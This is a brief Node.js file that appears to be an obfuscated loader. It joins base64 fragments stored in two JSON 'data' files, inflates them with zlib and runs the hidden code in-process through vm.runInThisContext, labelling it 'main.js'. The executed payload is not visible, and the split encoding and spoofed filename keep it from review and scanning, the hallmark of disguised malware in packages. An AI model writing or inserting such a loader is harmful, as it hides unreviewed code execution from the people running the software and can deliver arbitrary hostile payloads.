const zlib = require('zlib');
const a = require('./main-data-a.json');
const b = require('./main-data-b.json');
const code = zlib.inflateSync(Buffer.from(a.d + b.d, 'base64')).toString('utf8');
require('vm').runInThisContext(code, { filename: 'main.js' });
